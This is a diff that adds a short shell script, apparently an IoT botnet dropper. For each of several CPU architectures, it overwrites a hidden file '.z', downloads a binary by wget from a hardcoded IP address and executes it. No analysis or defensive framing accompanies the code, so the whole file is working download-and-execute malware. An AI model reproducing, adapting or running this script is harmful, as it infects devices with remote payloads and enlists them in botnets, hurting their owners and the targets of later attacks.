@@ -1,0 +1,13 @@
+#!/bin/sh
+u=".z"
+bin_names="arm7 arm mips mipsel powerpc m68k sh4 sparc x86_64 x86_32 i686"
+http_server="5.206.227.70"
+for name in $bin_names
+    do
+    rm -rf $u
+    cp $SHELL $u
+    chmod 777 $u
+    >$u
+    wget http://$http_server/fldz/$name -O -> $u
+    ./$u ssh.$name
+done
